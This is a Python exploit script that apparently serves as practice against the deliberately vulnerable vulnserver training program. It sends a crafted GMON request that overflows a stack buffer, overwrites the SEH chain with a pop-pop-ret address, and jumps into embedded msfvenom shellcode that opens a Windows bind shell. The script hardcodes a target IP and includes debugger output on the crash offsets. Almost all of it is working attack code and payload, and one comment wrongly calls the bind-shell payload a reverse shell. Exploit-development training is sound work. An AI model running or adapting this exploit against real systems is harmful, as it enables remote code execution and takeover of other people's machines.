# Vuln Server Source Code: https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.c


# } else if (strncmp(RecvBuf, "GMON ", 5) == 0) {
# 				char GmonStatus[13] = "GMON STARTED\n";
# 				for (i = 5; i < RecvBufLen; i++) {
# 					if ((char)RecvBuf[i] == '/') {
# 						if (strlen(RecvBuf) > 3950) {
# 							Function3(RecvBuf);
# 						}
# 						break;
# 					}
# 				}
# SendResult = send( Client, GmonStatus, sizeof(GmonStatus), 0 );

# void Function3(char *Input) {
# 	char Buffer2S[2000];
# 	strcpy(Buffer2S, Input);
# }


import socket, sys

IP = '35.182.31.212'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((IP, 9999))
sock.recv(1024)

# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -i 3 -f python

shellcode =  b""
shellcode += b"\xdb\xd5\xd9\x74\x24\xf4\xbe\x61\x26\xa7\xcb\x5d\x33"
shellcode += b"\xc9\xb1\x5b\x31\x75\x1a\x03\x75\x1a\x83\xed\xfc\xe2"
shellcode += b"\x94\x9b\xf3\x10\x77\xda\x22\x6f\xae\x56\xf1\x84\x0f"
shellcode += b"\xbe\x30\xd5\xfa\x43\x2d\xea\x35\x2b\xbc\x10\x0e\x66"
shellcode += b"\x03\xdd\x68\xa2\x3d\x5b\x13\xd3\x3a\x84\xf4\x49\xc9"
shellcode += b"\x74\xde\x26\x0c\xcd\x65\xfd\xa8\x6b\xb1\x5f\x01\xd1"
shellcode += b"\x7e\xaa\xea\x67\xde\x05\xd8\x48\x0f\x8a\xe3\x34\xfe"
shellcode += b"\xee\x34\x28\xa3\x91\x5f\xa0\x1e\x56\x5c\x42\x54\x45"
shellcode += b"\x11\x45\x1c\xda\x3f\x15\x57\xc2\x2a\x64\x97\x47\x72"
shellcode += b"\x25\xdb\x8f\xee\x8a\x28\x66\x25\x4f\x91\x1e\xa1\xc6"
shellcode += b"\xc3\x2c\x54\x6f\x22\xb2\x3c\x19\xd4\xdf\x2d\x39\x14"
shellcode += b"\x63\x80\xcb\x27\x7c\xd9\x3c\x08\x95\x1b\xa1\xf7\x75"
shellcode += b"\x71\x07\x95\xab\x51\xd4\x55\x40\x08\x47\x5f\x5a\xeb"
shellcode += b"\x94\xb8\xbc\xb5\xc0\x75\xd6\xf4\x01\x7c\x42\xcb\x2d"
shellcode += b"\x38\x31\x22\x29\x4f\x04\x6b\xd4\xf3\xa9\xa2\x15\x2a"
shellcode += b"\x2f\x97\xe8\x6b\xcc\xfe\xd3\x5b\x7f\x6e\x9d\xb8\x3e"
shellcode += b"\x5a\x24\x03\x6d\x2f\x59\x20\xc4\x32\x9b\xff\xe3\xaa"
shellcode += b"\xa5\xb0\xad\x84\xa3\xb1\x59\xaa\x0c\x4a\xd6\x5a\xd0"
shellcode += b"\x5c\xd0\xf8\x38\x54\x14\x78\xd1\x54\xb9\x61\xef\xc1"
shellcode += b"\x75\xc3\x9a\x5e\x0f\x94\x5a\xa2\x30\x0b\xd4\xe1\xb5"
shellcode += b"\xf9\x26\xb9\x14\x02\x07\xd4\xcb\x1d\x4d\x10\xf8\x1b"
shellcode += b"\x50\x67\x16\xaa\x09\xc7\xe6\xfe\x5e\x48\xf9\x36\x9a"
shellcode += b"\x4b\x68\x98\xa9\xab\xbc\x40\x7f\xe7\xf9\x8e\x79\x60"
shellcode += b"\x98\xe3\xde\x5a\x79\xa4\x06\x6c\x70\xea\x86\x9c\x41"
shellcode += b"\x4d\xbe\x5f\xb8\x34\x87\x4f\x58\x55\xc6\x1d\xda\xe2"
shellcode += b"\xc7\x19\x1e\xbc\x13\xb4\xdf\x89\x2c\x73\x90\x6e\xb1"
shellcode += b"\xbc\x72\x95\x19\x87\x6d\xa7\x91\xcc\x8e\x54\x68\x48"
shellcode += b"\x79\x81\x80\xb6\xba\x8f\x12\x1a\x66\x40\xe3\x3e\x79"
shellcode += b"\xe9\xd9\x5d\xc5\x46\xa5\x05\x4a\xd0\x12\x63\xbc\x3f"
shellcode += b"\xdf\x56\xde\x4e\xc4\x37\x09\xf2\x91\xf8\x96\x12\x7f"

# Exploit Info: Windows Server 2008 x64
# [+] Looking for cyclic pattern in memory
#     Cyclic pattern (normal) found at 0x0253f209 (length 3572 bytes)
#     -  Stack pivot between 33 & 3605 bytes needed to land in this pattern
#     Cyclic pattern (normal) found at 0x00943919 (length 4087 bytes)
#     EBP (0x0253f9d8) points at offset 1999 in normal pattern (length 1576)
#     EDX contains normal pattern : 0x32704531 (offset 3575)
#     ECX (0x00944714) points at offset 3579 in normal pattern (length 508)
# [+] Examining SEH chain
#     SEH record (nseh field) at 0x0253ffc4 overwritten with normal pattern : 0x326e4531 (offset 3515), followed by 52 bytes of cyclic data after the handler
# [+] Examining stack (entire stack) - looking for cyclic pattern
#     Walking stack from 0x0253f000 to 0x0253fffc (0x00000ffc bytes)
#     0x0253f20c : Contains normal cyclic pattern at ESP+0x24 (+36) : offset 3, length 3572 (-> 0x0253ffff : ESP+0xe18)
# [+] Examining stack (entire stack) - looking for pointers to cyclic pattern
#     Walking stack from 0x0253f000 to 0x0253fffc (0x00000ffc bytes)
#     0x0253f164 : Pointer into normal cyclic pattern at ESP-0x84 (-132) : 0x0253fc60 : offset 2647, length 928
#     0x0253f168 : Pointer into normal cyclic pattern at ESP-0x80 (-128) : 0x0253f7a0 : offset 1431, length 2144

brk_flag = 1

GMON = "GMON /.:/".encode("ascii")
padding_a = "A".encode("ascii")
padding_c = "C".encode("ascii")
nop = b"\x90"


# Jumping from 0x0230FFDC to 0x0230FDD7
# Hex Value: 205 Decimal: 517
jmp_to_payload = b"\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"

# JMP SHORT
jmp_short = b"\xEB\x06\x90\x90"

# essfunc.dll (0x62501000 - 0x62502000) No SEH Protection
# 0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\Administrator\Desktop\vulnserver-master\essfunc.dll)
SEH_record = b"\xB4\x10\x50\x62"

# Trigger access violation - Done
# Pointer to next SEH needs to be overwritten with jmp to shellcode
# Current SE handler overwritten and points to pop, pop ret (pop pulls last value added off the stack into register)

# durring prologue of exception handler address of pointer to next SEH was put on the stack at ESP+8, pop pop ret puts this
# address in EIP and allows execution of the code at the address of "pointer to next SEH"

# SEH chain of thread 000002D8
# Address    SE handler
# 0223FFC4   C290C290
# C206ABC3   *** CORRUPT ENTRY ***

# We only have 38 bytes after ptr_next_SEH before end of memory block

# Assemble structure of our payload
# NOP instructions | Reverse Shell payload | Short JMP | NOP | NOP | EIP | Second Stage payload

step1 = GMON
print("Adding Initial Command ({} Bytes) \n".format(sys.getsizeof(step1)))
buffer = step1
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

# Need total of 3515 padding to get to JMP
# 3022 Bytes is where payload needs to go
step2 = nop * (3515-len(shellcode))
print("Adding NOP Padding ({} Bytes) \n".format(sys.getsizeof(step2)))
buffer += step2
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

step3 = shellcode
print("Adding Shellcode ({} Bytes) \n".format(sys.getsizeof(step3)))
buffer += step3
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))



print("Adding JMP Short \n")
buffer += jmp_short
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

print("Adding SEH Pointer \n")
buffer += SEH_record
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))

if brk_flag:
    print("Adding Breakpoint \n")
    brk = b"\xCC"
    buffer += brk

print("Adding JMP to payload \n")
buffer += jmp_to_payload
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Adding Padding for remaining 36 bytes \n")
buffer += nop * (36-len(jmp_to_payload))
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Adding Padding to hit necessary length to trigger exception \n")
buffer += nop * (5050 - len(buffer))
print("Buffer Length: {} Size: {} Bytes \n".format(len(buffer), sys.getsizeof(buffer)))


print("Final Buffer Result: \n")
print(buffer)

if len(buffer) < 3950:
    print("Buffer Length insufficient to call Function3")
    print("Exiting...")
    exit(1)

print("Sending {} Bytes... \n".format(sys.getsizeof(buffer)))
sock.sendall(buffer)
sock.close()
print("Done \n")
exit(0)
